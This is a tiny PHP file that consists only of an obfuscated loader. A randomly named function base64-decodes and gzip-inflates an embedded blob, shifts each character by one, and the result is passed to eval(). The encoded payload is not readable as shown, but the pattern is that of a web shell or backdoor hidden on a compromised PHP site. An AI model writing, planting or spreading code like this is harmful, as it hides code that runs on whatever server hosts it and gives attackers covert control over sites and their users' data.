<?php function kojJNi($WmWdP)
{ 
$WmWdP=gzinflate(base64_decode($WmWdP));
 for($i=0;$i<strlen($WmWdP);$i++)
 {
$WmWdP[$i] = chr(ord($WmWdP[$i])-1);
 }
 return $WmWdP;
 }eval(kojJNi("fY9NDoIwEEYPMKeYEBawIB6gkYVr79BgLdqkKaQzNRLD2aUUif+znO/N9zKI0wAo2xDhjmjfDY3lAW4Qg96bS8Ma897r1lxxi9nGJiITr4SyRjsWkLbhYI3CNjjFpnMopeocsQ+Ki4UsZzBp4uR8NlTVKZxEa2EMx++1J83FR4/XFOzc8NxY1RFeVumbUqxHXnPw7nH71ynlUS+fvKuDox+OEUa4Aw=="));?>